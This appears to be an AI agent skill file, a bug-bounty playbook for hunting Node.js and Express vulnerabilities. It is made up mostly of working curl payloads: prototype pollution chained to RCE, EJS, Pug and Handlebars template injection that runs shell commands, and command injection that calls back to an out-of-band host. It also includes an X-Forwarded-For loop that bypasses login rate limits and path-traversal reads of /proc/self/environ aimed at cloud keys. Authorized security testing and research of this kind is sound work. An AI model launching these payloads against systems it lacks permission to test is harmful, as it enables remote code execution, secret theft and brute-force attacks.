---
name: hunt-nodejs
description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
sources: hackerone_public, snyk_research, portswigger_research
report_count: 24
---

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

## Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

## Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

## Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

## Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

**ESM entry points.** Every `process.mainModule.require(...)` payload above assumes a CommonJS entry. `process.mainModule` is deprecated (since v14) and tracks `require.main`, which the Node docs say is `undefined` "when the entry point is not a CommonJS module", so on an ESM app (`"type": "module"`, `.mjs` entry) these payloads throw a `TypeError` naming `mainModule`. That error means the expression evaluated, so do not record the sink as safe. The ESM-safe equivalent is `process.getBuiltinModule` (added in v22.3.0 and v20.16.0; undefined on older runtimes):

```bash
# Same benign `id` proof as above, ESM-safe
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.getBuiltinModule(\"child_process\").execSync(\"id\").toString() %>"}'
```

---

## Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

## Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Phase 8 - Node Runtime Version Gates

Two core-runtime bugs turn on the Node version, not the app code. Pin the version first (leaked `package.json` `engines`, `.nvmrc`, Dockerfile `FROM node:<tag>`, an error stack, or a reflected `process.version`) and state how you got it.

| CVE | Bug | Precondition on the target | Fixed in |
|---|---|---|---|
| CVE-2025-27210 (High) | Windows device names (`CON`, `PRN`, `AUX`) bypass path-traversal protection in `path.normalize()` / `path.join()`; incomplete fix for CVE-2025-23084 | Windows host; the app joins user input into a path and relies on normalization to stay under a root | 20.19.4, 22.17.1, 24.4.1 |
| CVE-2025-55130 (High) | Crafted relative symlink paths escape the Permission Model's `--allow-fs-read` / `--allow-fs-write` | The service runs tenant or user-supplied scripts under the Permission Model (code runners, plugin sandboxes) and the script can create symlinks | 20.20.0, 22.22.0, 24.13.0, 25.3.0 |

A version string alone is informational. Report only with a read of a marker file you planted (your own tenant's workspace, or a file the program designates) returned through the app's own feature. Sources: https://nodejs.org/en/blog/vulnerability/july-2025-security-releases (CVE-2025-27210), https://nodejs.org/en/blog/vulnerability/december-2025-security-releases (CVE-2025-55130, released 2026-01-13).

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)
